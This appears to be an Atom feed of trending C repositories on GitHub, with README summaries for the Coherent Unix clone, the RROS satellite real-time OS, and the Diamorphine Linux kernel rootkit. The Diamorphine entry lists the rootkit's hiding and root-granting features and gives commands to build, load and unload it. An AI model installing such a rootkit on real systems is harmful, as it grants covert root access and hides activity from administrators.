<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-12-13T01:27:27Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>gspu/Coherent</title>
    <updated>2023-12-13T01:27:27Z</updated>
    <id>tag:github.com,2023-12-13:/gspu/Coherent</id>
    <link href="https://github.com/gspu/Coherent" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Coherent OS&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Coherent&lt;/h1&gt; &#xA;&lt;p&gt;Coherent is a clone of the Unix operating system for IBM PC compatibles and other microcomputers, developed and sold by the now-defunct Mark Williams Company (MWC). Historically, the operating system was a proprietary product, but it became open source in 2015, released under a 3-clause BSD License.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Coherent_(operating_system)&#34;&gt;https://en.wikipedia.org/wiki/Coherent_(operating_system)&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Manpages:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.nesssoftware.com/home/mwc/manpage.php?contents&#34;&gt;http://www.nesssoftware.com/home/mwc/manpage.php?contents&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Manual:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.nesssoftware.com/home/mwc/manual.php&#34;&gt;http://www.nesssoftware.com/home/mwc/manual.php&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;VM:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.autometer.de/unix4fun/coherent/#vbox&#34;&gt;https://www.autometer.de/unix4fun/coherent/#vbox&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.autometer.de/unix4fun/coherent/ftp/vms/&#34;&gt;https://www.autometer.de/unix4fun/coherent/ftp/vms/&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>m0nad/Diamorphine</title>
    <updated>2023-12-13T01:27:27Z</updated>
    <id>tag:github.com,2023-12-13:/m0nad/Diamorphine</id>
    <link href="https://github.com/m0nad/Diamorphine" rel="alternate"></link>
    <summary type="html">&lt;p&gt;LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Diamorphine&lt;/h1&gt; &#xA;&lt;p&gt;Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64)&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;When loaded, the module starts invisible;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Hide/unhide any process by sending a signal 31;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Sending a signal 63(to any pid) makes the module become (in)visible;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Sending a signal 64(to any pid) makes the given user become root;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Files or directories starting with the MAGIC_PREFIX become invisible;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Source: &lt;a href=&#34;https://github.com/m0nad/Diamorphine&#34;&gt;https://github.com/m0nad/Diamorphine&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Install&lt;/h2&gt; &#xA;&lt;p&gt;Verify if the kernel is 2.6.x/3.x/4.x/5.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;uname -r&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Clone the repository&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/m0nad/Diamorphine&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Enter the folder&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd Diamorphine&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Compile&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Load the module(as root)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;insmod diamorphine.ko&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Uninstall&lt;/h2&gt; &#xA;&lt;p&gt;The module starts invisible, to remove you need to make it visible&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;kill -63 0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then remove the module(as root)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;rmmod diamorphine&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;References&lt;/h2&gt; &#xA;&lt;p&gt;Wikipedia Rootkit &lt;a href=&#34;https://en.wikipedia.org/wiki/Rootkit&#34;&gt;https://en.wikipedia.org/wiki/Rootkit&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Linux Device Drivers &lt;a href=&#34;http://lwn.net/Kernel/LDD3/&#34;&gt;http://lwn.net/Kernel/LDD3/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;LKM HACKING &lt;a href=&#34;https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html&#34;&gt;https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Memset&#39;s blog &lt;a href=&#34;http://memset.wordpress.com/&#34;&gt;http://memset.wordpress.com/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Linux on-the-fly kernel patching without LKM &lt;a href=&#34;http://phrack.org/issues/58/7.html&#34;&gt;http://phrack.org/issues/58/7.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;WRITING A SIMPLE ROOTKIT FOR LINUX &lt;a href=&#34;https://web.archive.org/web/20160620231623/http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt&#34;&gt;https://web.archive.org/web/20160620231623/http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Linux Cross Reference &lt;a href=&#34;http://lxr.free-electrons.com/&#34;&gt;http://lxr.free-electrons.com/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;zizzu0 LinuxKernelModules &lt;a href=&#34;https://github.com/zizzu0/LinuxKernelModules/&#34;&gt;https://github.com/zizzu0/LinuxKernelModules/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Linux Rootkits: New Methods for Kernel 5.7+ &lt;a href=&#34;https://xcellerator.github.io/posts/linux_rootkits_11/&#34;&gt;https://xcellerator.github.io/posts/linux_rootkits_11/&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>BUPT-OS/RROS</title>
    <updated>2023-12-13T01:27:27Z</updated>
    <id>tag:github.com,2023-12-13:/BUPT-OS/RROS</id>
    <link href="https://github.com/BUPT-OS/RROS" rel="alternate"></link>
    <summary type="html">&lt;p&gt;RROS is a dual-kernel OS for satellites or other scenarios that need both real-time and general-purpose abilities. RROS = RTOS (Rust) + Linux (C).&lt;/p&gt;&lt;hr&gt;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://github.com/Richardhongyu/RROS/assets/33805041/d8ccbeb0-c0f5-4634-8108-017367d35a4b&#34; width=&#34;70%&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://BUPT-OS.github.io/website/docs/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/view-docs-blue&#34; alt=&#34;Documentation&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/BUPT-OS/RROS/actions/workflows/ci.yaml&#34;&gt;&lt;img src=&#34;https://github.com/BUPT-OS/RROS/actions/workflows/ci.yaml/badge.svg?sanitize=true&#34; alt=&#34;.github/workflows/ci.yaml&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://rros.zulipchat.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/chat-on%20zulip-brightgreen&#34; alt=&#34;Zulip chat&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/badge/RROS-0.0.1-orange&#34; alt=&#34;RROS&#34;&gt; &lt;a href=&#34;https://github.com/BUPT-OS/RROS/raw/master/README.md&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/lang-en-yellow.svg?sanitize=true&#34; alt=&#34;en&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/BUPT-OS/RROS/raw/master/README.zh.md&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/lang-%E4%B8%AD%E6%96%87-yellow.svg?sanitize=true&#34; alt=&#34;zh&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;RROS is a dual-kernel OS, consisting of a real-time kernel (in Rust) and a general-purpose kernel (Linux). RROS is compatible with almost all native Linux programs and offers real-time performance superior to RT-Linux. It is also being experimented with as the host OS for in-orbit satellites (&lt;a href=&#34;http://www.tiansuan.org.cn/&#34;&gt;Tiansuan Project&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;p&gt;Here is an &lt;a href=&#34;https://bupt-os.github.io/website/docs/introduction/architecture.jpg&#34;&gt;architecture diagram&lt;/a&gt; and a &lt;a href=&#34;https://bupt-os.github.io/website/docs/introduction/demo.mp4&#34;&gt;demo video&lt;/a&gt; of RROS.&lt;/p&gt; &#xA;&lt;h2&gt;News&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;[2023.12.09] &lt;span&gt;ðŸ”¥&lt;/span&gt;&lt;span&gt;ðŸ”¥&lt;/span&gt; RROS is successfully launched into space! (&lt;a href=&#34;https://bupt-os.github.io/website/news/2023_12_9/satellite_launch/&#34;&gt;photos&lt;/a&gt;).&lt;/li&gt; &#xA; &lt;li&gt;[2023.11.30] RROS is presented at Xenomai Workshop 2023 (&lt;a href=&#34;https://bupt-os.github.io/website/news/2023_11_30/xenomai_workshop/&#34;&gt;photos&lt;/a&gt;).&lt;/li&gt; &#xA; &lt;li&gt;[2023.11.28] &lt;span&gt;ðŸ”¥&lt;/span&gt; RROS is open-sourced!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Why RROS&lt;/h2&gt; &#xA;&lt;p&gt;RROS is primarily intended for satellites (onboard computers, payloads, etc). The key incentive is the trend that nowadays satellites serve both traditional satellite-borne real-time tasks (e.g., communication and positioning) and general-purpose tasks that need mature, complicated software support (e.g., data compression and machine learning). That catalyzes the dual-kernel architecture of RROS. Taking a step further, the real-time kernel of RROS is fully implemented in Rust for better safety and robustness. However, RROS can be used in scenarios like automatic cars, IoTs, industrial control, etc.&lt;/p&gt; &#xA;&lt;p&gt;The advantages of RROS are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Hard real-time&lt;/strong&gt;: RROS offers superior real-time performance compared to RT-Linux. RROS is designed with an efficient task scheduler that can quickly respond to external events, reducing task switching and processing delays.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Compatibility&lt;/strong&gt;: RROS is compatible with almost every Linux program, allowing seamless migration of complex Linux applications such as TensorFlow and Kubernetes. You can also easily modify your general Linux programs into a more real-time counterpart.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Easy to use&lt;/strong&gt;: RROS facilitates easy programming and debugging of real-time programs. RROS uses the libevl interface to call real-time APIs for user programs, allowing you to use tools like gdb, kgdb, and QEMU.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Robustness&lt;/strong&gt;: The real-time kernel of RROS is carefully written in Rust, making it safer and more robust, especially for memory and concurrency issues.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Quick start&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://bupt-os.github.io/website/docs/introduction/quick-start/&#34;&gt;Kick off with RROS easily&lt;/a&gt;: boot, run, test, and develop with RROS.&lt;/p&gt; &#xA;&lt;h2&gt;Document&lt;/h2&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://bupt-os.github.io/website/docs/&#34;&gt;document&lt;/a&gt; including:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bupt-os.github.io/website/docs/introduction/quick-start&#34;&gt;Quick Start&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bupt-os.github.io/website/docs/tutorial/setup-the-environment&#34;&gt;Setup the Environment&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bupt-os.github.io/website/docs/tutorial/choose-a-file-system&#34;&gt;Choose a file System&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bupt-os.github.io/website/docs/tutorial/deploy-rros-on-the-raspberry-pi&#34;&gt;Deploy RROS on the Raspberry Pi&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bupt-os.github.io/website/docs/tutorial/debug&#34;&gt;Debug&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bupt-os.github.io/website/docs/tutorial/kernel-tools&#34;&gt;Kernel Tools&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Communication &amp;amp; Contribution&lt;/h2&gt; &#xA;&lt;p&gt;Contact us at &lt;a href=&#34;https://rros.zulipchat.com/&#34;&gt;Zulip Forum&lt;/a&gt; or with email &lt;code&gt;buptrros AT gmail.com&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Contributions are also very welcomed! &lt;a href=&#34;https://bupt-os.github.io/website/docs/contributing/contributing/&#34;&gt;Check it out&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Roadmap&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://bupt-os.github.io/website/docs/roadmap/roadmap&#34;&gt;here&lt;/a&gt; for our future roadmap.&lt;/p&gt; &#xA;&lt;h2&gt;Who are we&lt;/h2&gt; &#xA;&lt;p&gt;We are a &lt;a href=&#34;https://bupt-os.github.io/website/docs/team/team/&#34;&gt;research group&lt;/a&gt; at BUPT.&lt;/p&gt; &#xA;&lt;h2&gt;Release&lt;/h2&gt; &#xA;&lt;p&gt;The RROS relies on both the dovetail and the Rust for Linux(RFL), neither of which currently provides patches. Integrating one into the other at a high frequency is challenging. As a result, RROS is currently tied to Linux kernel version 5.13, built on top of linux-dovetail-v5.13, and readily compatible with RFL patch v1. Fortunately, RFL is swiftly making its way into the mainline Linux kernel. We plan to release new versions once most of the RFL APIs we depend on are available in the linux-dovetail mainline. At that point, we will further consider Long-Term Support (LTS) versions.&lt;/p&gt; &#xA;&lt;h2&gt;Acknowledgements&lt;/h2&gt; &#xA;&lt;p&gt;RROS has benefitted from the following projects/resources.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://evlproject.org/core/&#34;&gt;Evl/xenomai (linux-evl)&lt;/a&gt;. We learned from evl core how to implement a dual kernel and use dovetail for interrupt virtualization and libevl for user library. Thanks, @Philippe for his genius work and patient explanation in the riot!&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Rust-for-Linux/linux&#34;&gt;Rust-for-Linux&lt;/a&gt;: We use RFL to write RROS in Linux. We ask a lot of questions on RFL Zulip and constructing safety abstractions. Kudos to @ojeda, @Wedson, @Alex, @boqun, @Gary, @BjÃ¶rn in the RFL community for patiently helping us. We hope to bring more safety abstraction back to the RFL in return!&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/wsg1100/p/13836497.html&#34;&gt;Muduo&lt;/a&gt;: His detailed blog gives us insights for xenomai/evl project.&lt;/li&gt; &#xA; &lt;li&gt;All prospective contributors to RROS in the future!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Citation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;@misc{li2023rros,&#xA;    title = {RROS: A Dual-kernel Real-time Operating System in Rust},&#xA;    url = {https://github.com/BUPT-OS/RROS},&#xA;    author = {Hongyu Li and Jiangtao Hu and Qichen Qiu and Yuxuan Shan and Bochen Wang and Jiajun Du and Yexuan Yang and Xinge Wang and Shangguang Wang and Mengwei Xu},&#xA;    month = {December},&#xA;    year = {2023}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;The source code of RROS is under the License of GPL-2.0.&lt;/p&gt;</summary>
  </entry>
</feed>